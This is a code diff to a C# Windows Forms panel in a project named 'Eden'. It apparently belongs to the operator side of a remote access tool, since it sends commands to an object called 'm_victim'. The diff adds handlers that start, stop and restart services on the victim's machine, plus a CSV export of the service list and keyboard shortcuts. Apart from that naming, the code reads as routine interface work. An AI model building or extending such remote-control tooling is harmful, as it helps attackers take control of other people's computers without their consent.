@@ -40,33 +40,36 @@ namespace Eden
 
                         Invoke(new Action(() => listView1.Items.Add(item)));
                     }
+
+                    Invoke(() => toolStripStatusLabel1.Text = $"Service[{listView1.Items.Count}]");
                 }
                 else if (lsMsg[1] == "start")
                 {
                     int nCode = int.Parse(lsMsg[2]);
                     string szName = lsMsg[3];
 
-                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Action failed.");
+                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Start service failed.");
                 }
                 else if (lsMsg[1] == "stop")
                 {
                     int nCode = int.Parse(lsMsg[2]);
                     string szName = lsMsg[3];
 
-                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Action failed.");
+                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Stop service failed.");
                 }
                 else if (lsMsg[1] == "restart")
                 {
                     int nCode = int.Parse(lsMsg[2]);
                     string szName = lsMsg[3];
 
-                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Action failed.");
+                    Invoke(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Restart service failed.");
                 }
             }
         }
 
         void fnInitServ()
         {
+            listView1.Items.Clear();
             toolStripStatusLabel1.Text = "Loading...";
 
             m_victim.fnSendCommand(new string[]
@@ -88,6 +91,8 @@ namespace Eden
             listView1.Columns.Add("Sub", 80);
             listView1.Columns.Add("Description", 250);
 
+            listView1.ContextMenuStrip = contextMenuStrip1;
+
             ToolStripMenuItem itemAll = new ToolStripMenuItem("All");
             itemAll.Click += (s, e) =>
             {
@@ -100,6 +105,7 @@ namespace Eden
             };
 
             toolStripMenuItem1.DropDownItems.Add(itemAll);
+            toolStripMenuItem1.DropDownItems.Add(new ToolStripSeparator());
 
             for (int i = 0; i < listView1.Columns.Count; i++)
             {
@@ -147,19 +153,107 @@ namespace Eden
         //Start
         private void toolStripMenuItem3_Click(object sender, EventArgs e)
         {
-
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                m_victim.fnSendCommand(new string[]
+                {
+                    "Service",
+                    "start",
+                    item.Text,
+                });
+            }
         }
 
         //Stop
         private void toolStripMenuItem4_Click(object sender, EventArgs e)
         {
-
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                m_victim.fnSendCommand(new string[]
+                {
+                    "Service",
+                    "stop",
+                    item.Text,
+                });
+            }
         }
 
         //Restart
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                m_victim.fnSendCommand(new string[]
+                {
+                    "Service",
+                    "restart",
+                    item.Text,
+                });
+            }
+        }
 
+        //Export
+        private void toolStripButton2_Click(object sender, EventArgs e)
+        {
+            SaveFileDialog sfd = new SaveFileDialog();
+            if (sfd.ShowDialog() == DialogResult.OK)
+            {
+                try
+                {
+                    StringBuilder sb = new StringBuilder();
+                    sb.AppendLine(string.Join(",", listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text)));
+                    foreach (ListViewItem item in listView1.Items)
+                        sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));
+
+                    File.WriteAllText(sfd.FileName, sb.ToString());
+
+                    MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void listView1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.Modifiers == Keys.Control)
+            {
+                if (e.KeyCode == Keys.A)
+                {
+                    listView1.Items.Cast<ListViewItem>().ToList().ForEach(x => x.Selected = true);
+                }
+                else if (e.KeyCode == Keys.S)
+                {
+                    SaveFileDialog sfd = new SaveFileDialog();
+                    if (sfd.ShowDialog() == DialogResult.OK)
+                    {
+                        try
+                        {
+                            StringBuilder sb = new StringBuilder();
+                            sb.AppendLine(string.Join(",", listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text)));
+                            foreach (ListViewItem item in listView1.Items)
+                                sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));
+
+                            File.WriteAllText(sfd.FileName, sb.ToString());
+
+                            MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        }
+                    }
+                }
+            }
+            else
+            {
+                if (e.KeyCode == Keys.F5)
+                {
+                    fnInitServ();
+                }
+            }
         }
     }
 }
